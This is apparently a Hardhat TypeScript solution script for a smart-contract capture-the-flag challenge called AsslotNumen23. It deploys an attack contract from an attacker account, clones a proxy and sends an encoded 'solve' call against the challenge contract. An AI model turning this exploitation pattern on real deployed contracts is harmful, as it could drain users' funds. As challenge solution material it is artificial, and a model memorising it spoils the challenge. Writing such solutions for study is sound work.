import chalk from "chalk";
import { ethers } from "hardhat";
import { AsslotNumen23__factory, AsslotNumen23, AsslotNumen23Attack__factory } from "../../typechain";
import { log, initialize } from "../utils";

async function main() {
    let [asslotNumen23Contract, attacker] = await initialize<AsslotNumen23>(AsslotNumen23__factory);
    const asslotNumen23Attack = await new AsslotNumen23Attack__factory(attacker).deploy();
    await asslotNumen23Attack.waitForDeployment();
    
    let tx: any = await asslotNumen23Attack.clone();
    await tx.wait();
    const proxyAddress = await asslotNumen23Attack.proxyAddress();
    log(`Proxy contract address: ${proxyAddress}`);
    let contractInterface = asslotNumen23Attack.interface;
    let calldata = contractInterface.encodeFunctionData("solve", [await asslotNumen23Contract.getAddress()]);
    tx = await attacker.sendTransaction({
      to: proxyAddress,
        data: calldata,
        gasLimit: 300000
    })
    await tx.wait();
    log(`Solved with transaction ${chalk.yellow(tx.hash)}`);

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});